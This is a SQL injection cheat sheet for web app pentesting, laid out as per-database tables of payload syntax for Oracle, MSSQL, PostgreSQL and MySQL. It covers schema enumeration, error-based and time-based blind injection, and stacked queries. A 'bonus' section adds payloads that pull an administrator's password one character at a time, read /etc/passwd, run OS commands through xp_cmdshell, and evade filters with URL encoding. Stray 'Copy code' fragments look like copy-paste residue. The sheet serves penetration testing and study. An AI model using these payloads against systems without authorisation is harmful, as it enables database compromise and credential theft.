# SQL Injection Cheat Sheet
A practical SQL injection cheat sheet containing useful syntax, payload patterns, and DB-specific behaviours you’ll encounter during real-world web app pentesting.

---

## String Concatenation
Join multiple strings together.

| Database | Syntax |
|---------|--------|
| **Oracle** | `'foo' \|\| 'bar'` |
| **Microsoft SQL Server** | `'foo' + 'bar'` |
| **PostgreSQL** | `'foo' \|\| 'bar'` |
| **MySQL** | `'foo' 'bar'` *(space concatenation)*<br>`CONCAT('foo','bar')` |

---

## Substring Extraction
Offset index is **1-based**.

All return `"ba"` from `"foobar"`:

| Database | Syntax |
|---------|--------|
| Oracle | `SUBSTR('foobar',4,2)` |
| Microsoft | `SUBSTRING('foobar',4,2)` |
| PostgreSQL | `SUBSTRING('foobar',4,2)` |
| MySQL | `SUBSTRING('foobar',4,2)` |

---

## SQL Comments (truncate rest of query)
| Database | Syntax |
|----------|--------|
| Oracle | `--comment` |
| Microsoft | `--comment`, `/*comment*/` |
| PostgreSQL | `--comment`, `/*comment*/` |
| MySQL | `#comment`<br>`-- comment` *(space required)*<br>`/*comment*/` |

---

## Finding Database Version
Useful for tailoring payloads.

| Database | Query |
|----------|--------|
| Oracle | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
| Microsoft SQL Server | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

---

## Enumerating Database Contents

### Tables and Columns

| Database | Tables | Columns |
|----------|--------|---------|
| Oracle | `SELECT * FROM all_tables` | `SELECT * FROM all_tab_columns WHERE table_name='TABLE'` |
| MSSQL | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name='TABLE'` |
| PostgreSQL | Same as MSSQL | Same as MSSQL |
| MySQL | Same as MSSQL | Same as MSSQL |

---

## Conditional Errors (Error-Based Blind SQLi)

Used to leak TRUE/FALSE by intentionally crashing the DB.

| Database | Payload |
|----------|---------|
| **Oracle** | `SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| MSSQL | `SELECT CASE WHEN (COND) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (COND) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(COND,(SELECT table_name FROM information_schema.tables),'a')` |

### Oracle Injection Wrapper (most important)
'||(SELECT CASE WHEN (YOUR_CONDITION)
THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'

pgsql
Copy code

---

## Extracting Data via Visible Errors

| Database | Example |
|----------|----------|
| MSSQL | `SELECT 'foo' WHERE 1=(SELECT 'secret')` |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` |
| MySQL | `SELECT EXTRACTVALUE(1, CONCAT(0x5c,(SELECT 'secret')))` |

---

## Batched / Stacked Queries
Execute multiple queries at once.

| Database | Syntax |
|----------|--------|
| Oracle | ❌ Not supported |
| MSSQL | `QUERY1; QUERY2` |
| PostgreSQL | `QUERY1; QUERY2` |
| MySQL | `QUERY1; QUERY2` *(works only with some APIs like PDO or MySQLdb)* |

---

## Time Delays
Used for blind SQLi when no errors or output.

| Database | Delay |
|----------|--------|
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| MSSQL | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

---

## Conditional Time Delays
Execute a delayed response only if condition is TRUE.

| DB | Payload |
|----|---------|
| Oracle | `SELECT CASE WHEN (COND) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| MSSQL | `IF(COND) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (COND) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(COND,SLEEP(10),'a')` |

---

# Bonus Pentester Payloads (Extra Section)

## Check Current Database User
SELECT user;
SELECT CURRENT_USER;
SELECT USER();

---

## Check Number of Rows
(SELECT COUNT(*) FROM users)


---

## Oracle: Extract ASCII Values (Ultimate Blind Extract)
'||(SELECT CASE WHEN (
ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),POS,1)) > MID
) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'


---

## 🔹 Determine Length of a String
(SELECT LENGTH(password) FROM users WHERE username='administrator')


---

## 🔹 Classic UNION SELECT Injection (MySQL/PostgreSQL/MSSQL)
UNION SELECT 1,2,'test'


---

## 🔹 PostgreSQL Read System Files (if allowed)
SELECT pg_read_file('/etc/passwd',0,2000);

---

## 🔹 SQL Server — Remote Command Execution (if xp_cmdshell enabled)
EXEC xp_cmdshell 'whoami';

yaml
Copy code

---

## 🔹 URL Double Encoding Bypass
%27 → '
%20 → space
%26 → &
%23 → #

---

## 🔹 Oracle String Injection Wrapper
Use this when injecting inside a quoted value:

'||PAYLOAD||'

---

# 🎯 Manual Blind Extraction Template
for pos in range(1, length):
test ASCII(midpoint) via conditional error
determine char

---
